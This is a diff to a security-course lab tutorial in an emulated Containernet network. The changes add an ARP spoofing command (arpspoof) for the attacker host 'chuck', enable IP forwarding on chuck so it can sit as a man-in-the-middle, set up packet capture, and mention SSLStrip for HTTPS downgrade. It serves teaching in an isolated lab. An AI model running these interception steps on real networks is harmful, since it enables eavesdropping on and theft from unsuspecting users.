@@ -100,7 +100,11 @@ First, open one terminal for chuck.
 containernet> xterm chuck
 ```
 
-Then, in the chuck terminal perform the attack.
+Then, in the chuck terminal perform the attack with the command below:
+
+```
+chuck# arpspoof -i chuck-eth0 -t 10.200.0.1 10.200.0.4
+```
 
 At this point on, Chuck can even use simple tools like SSLStrip (available at /sslstrip) to perform attacks on HTTPS (Hyper Text Transfer Protocol Secure) via protocol downgrade.
 
@@ -265,7 +269,7 @@ from containernet.net import Containernet
 
 def topology():
     "Create a network."
-    DISPLAY_ID = 0
+    DISPLAY_ID = 1
     net = Containernet(ipBase='10.200.0.0/24')
 
     os.system('sudo xhost +local:docker')
@@ -275,20 +279,23 @@ def topology():
     s1 = net.addSwitch('s1', failMode="standalone")
     alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
-                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
-                           mac='00:00:00:00:00:01')
+                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:01')
     bob1 = net.addDocker('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                          volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
-                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
-                         mac='00:00:00:00:00:02')
+                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:02')
+    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
+                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
+                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:03')
 
     net.addLink(alice1, s1)
     net.addLink(bob1, s1)
+    net.addLink(chuck1, s1)
 
     info("*** Starting network\n")
     net.build()
     s1.start([])
 
+    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')
     bob1.cmd('service ssh start')
 
     info("*** Running CLI\n")
@@ -303,11 +310,19 @@ if __name__ == '__main__':
     topology()
 ```
 
-Then open new terminal for Chuck from s1 and start packet captures as below.
+Then open a terminal for Chuck.
 
 ```
-containernet> xterm s1
-s1# tcpdump -i s1-eth1 -w captura.pcap
+containernet> xterm chuck
+```
+
+We then perform ARP spoofing as in the previous exercise, but configure Chuck to intercept the traffic between Alice and Bob.
+
+Next, open a new terminal for Chuck and start packet capture, as shown below.
+
+```
+containernet> xterm chuck
+chuck# tcpdump -i chuck-eth0 -w capture.pcap
 ```
 
 Now, use netcat as below to make Bob listen for a connection on port 3000 and send the output of the connection to the file foo.txt.
@@ -331,6 +346,8 @@ Alice creates another new file with the same content as the previous file and se
 alice# echo 'Bob, I love you!' > bar.txt
 alice# scp bar.txt seg@10.200.0.2:/home/seg
 ```
+
+**Question**: Open the pcap file saved by Chuck and describe what could be observed regarding the two files transferred by Alice to Bob.
 
 <a name="tcp-session-hijacking"></a>
 ## TCP Session Hijacking
